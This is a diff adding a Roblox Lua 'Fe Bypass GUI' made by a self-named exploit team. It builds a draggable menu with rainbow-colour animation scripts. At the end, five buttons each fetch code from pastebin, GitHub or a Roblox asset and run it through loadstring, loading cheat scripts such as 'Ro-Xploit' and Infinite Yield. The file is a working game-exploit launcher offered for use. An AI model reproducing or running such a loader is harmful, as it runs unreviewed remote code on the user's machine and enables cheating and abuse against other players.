@@ -1,0 +1,390 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local Thomas = Instance.new("TextButton")
+local Xploit = Instance.new("TextButton")
+local Fe_Bypass2 = Instance.new("TextButton")
+local Tool = Instance.new("TextButton")
+local Idk = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.167492181, 0, 0.332446814, 0)
+Frame.Size = UDim2.new(0, 559, 0, 366)
+Frame.Active = true
+Frame.Draggable = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(85, 255, 255)
+TextLabel.BorderSizePixel = 3
+TextLabel.Position = UDim2.new(0.338103771, 0, 0.0163934417, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = "Fe Bypass GUI BY TEAM N00LKIDD"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+Thomas.Name = "Thomas"
+Thomas.Parent = TextLabel
+Thomas.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Thomas.BorderColor3 = Color3.fromRGB(85, 255, 255)
+Thomas.BorderSizePixel = 3
+Thomas.Position = UDim2.new(-0.910000026, 0, 1.41999996, 0)
+Thomas.Size = UDim2.new(0, 532, 0, 50)
+Thomas.Font = Enum.Font.SourceSans
+Thomas.Text = "Thomas"
+Thomas.TextColor3 = Color3.fromRGB(0, 0, 0)
+Thomas.TextScaled = true
+Thomas.TextSize = 14.000
+Thomas.TextWrapped = true
+
+Xploit.Name = "Xploit"
+Xploit.Parent = TextLabel
+Xploit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Xploit.BorderColor3 = Color3.fromRGB(85, 255, 255)
+Xploit.BorderSizePixel = 3
+Xploit.Position = UDim2.new(-0.910000026, 0, 2.66000009, 0)
+Xploit.Size = UDim2.new(0, 532, 0, 50)
+Xploit.Font = Enum.Font.SourceSans
+Xploit.Text = "Ro-Xploit"
+Xploit.TextColor3 = Color3.fromRGB(0, 0, 0)
+Xploit.TextScaled = true
+Xploit.TextSize = 14.000
+Xploit.TextWrapped = true
+
+Fe_Bypass2.Name = "Fe_Bypass2"
+Fe_Bypass2.Parent = TextLabel
+Fe_Bypass2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Fe_Bypass2.BorderColor3 = Color3.fromRGB(85, 255, 255)
+Fe_Bypass2.BorderSizePixel = 3
+Fe_Bypass2.Position = UDim2.new(-0.910000026, 0, 3.98000002, 0)
+Fe_Bypass2.Size = UDim2.new(0, 532, 0, 50)
+Fe_Bypass2.Font = Enum.Font.SourceSans
+Fe_Bypass2.Text = "Other Fe Bypass GUI"
+Fe_Bypass2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Fe_Bypass2.TextScaled = true
+Fe_Bypass2.TextSize = 14.000
+Fe_Bypass2.TextWrapped = true
+
+Tool.Name = "Tool"
+Tool.Parent = TextLabel
+Tool.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Tool.BorderColor3 = Color3.fromRGB(85, 255, 255)
+Tool.BorderSizePixel = 3
+Tool.Position = UDim2.new(-0.910000026, 0, 5.26000023, 0)
+Tool.Size = UDim2.new(0, 532, 0, 50)
+Tool.Font = Enum.Font.SourceSans
+Tool.Text = "Get Free Tools"
+Tool.TextColor3 = Color3.fromRGB(0, 0, 0)
+Tool.TextScaled = true
+Tool.TextSize = 14.000
+Tool.TextWrapped = true
+
+Idk.Name = "Idk"
+Idk.Parent = TextLabel
+Idk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Idk.BorderColor3 = Color3.fromRGB(85, 255, 255)
+Idk.BorderSizePixel = 3
+Idk.Position = UDim2.new(-0.910000026, 0, 6.48000002, 0)
+Idk.Size = UDim2.new(0, 532, 0, 36)
+Idk.Font = Enum.Font.SourceSans
+Idk.Text = "Infinite Yield"
+Idk.TextColor3 = Color3.fromRGB(0, 0, 0)
+Idk.TextScaled = true
+Idk.TextSize = 14.000
+Idk.TextWrapped = true
+
+-- Scripts:
+
+local function PKIPWI_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	while wait() do
+		for i = 0,255,5 do
+			script.Parent.TextColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
+			wait(0.01)
+		end
+	end
+end
+coroutine.wrap(PKIPWI_fake_script)()
+local function BOQMIMP_fake_script() -- TextLabel.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel)
+
+	while wait() do
+		for i = 0,255,5 do
+			script.Parent.TextColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
+			wait(0.01)
+		end
+	end
+end
+coroutine.wrap(BOQMIMP_fake_script)()
+local function YSKKGG_fake_script() -- Thomas.LocalScript 
+	local script = Instance.new('LocalScript', Thomas)
+
+	while wait() do
+		for i = 0,255,5 do
+			script.Parent.TextColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
+			wait(0.01)
+		end
+	end
+end
+coroutine.wrap(YSKKGG_fake_script)()
+local function OVVSOUM_fake_script() -- Xploit.LocalScript 
+	local script = Instance.new('LocalScript', Xploit)
+
+	while wait() do
+		for i = 0,255,5 do
+			script.Parent.TextColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
+			wait(0.01)
+		end
+	end
+end
+coroutine.wrap(OVVSOUM_fake_script)()
+local function STHI_fake_script() -- Fe_Bypass2.LocalScript 
+	local script = Instance.new('LocalScript', Fe_Bypass2)
+
+	while wait() do
+		for i = 0,255,5 do
+			script.Parent.TextColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
+			wait(0.01)
+		end
+	end
+end
+coroutine.wrap(STHI_fake_script)()
+local function ROTHPWF_fake_script() -- Tool.LocalScript 
+	local script = Instance.new('LocalScript', Tool)
+
+	while wait() do
+		for i = 0,255,5 do
+			script.Parent.TextColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
+			wait(0.01)
+		end
+	end
+end
+coroutine.wrap(ROTHPWF_fake_script)()
+local function CKFYR_fake_script() -- Idk.LocalScript 
+	local script = Instance.new('LocalScript', Idk)
+
+	while wait() do
+		for i = 0,255,5 do
+			script.Parent.TextColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
+			wait(0.01)
+		end
+		for i = 0,255,5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
+			wait(0.01)
+		end
+		for i = 255,0,-5 do
+			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
+			wait(0.01)
+		end
+	end
+end
+coroutine.wrap(CKFYR_fake_script)()
+local function ZHIG_fake_script() -- Frame.DragGui 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UserInputService = game:GetService("UserInputService")
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), 'Out', 'Linear', 0, true); -- drag speed
+	end
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+coroutine.wrap(ZHIG_fake_script)()
+Xploit.MouseButton1Down:connect(function() 
+	loadstring(game:GetObjects("rbxassetid://364364477")[1].Source)()
+end)
+Tool.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/AZVi2tuK"))()
+end)
+Fe_Bypass2.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Enes5858/Enes5858/main/SKIDDDDD.txt"))()
+end)
+Thomas.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
+end)
+Idk.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end
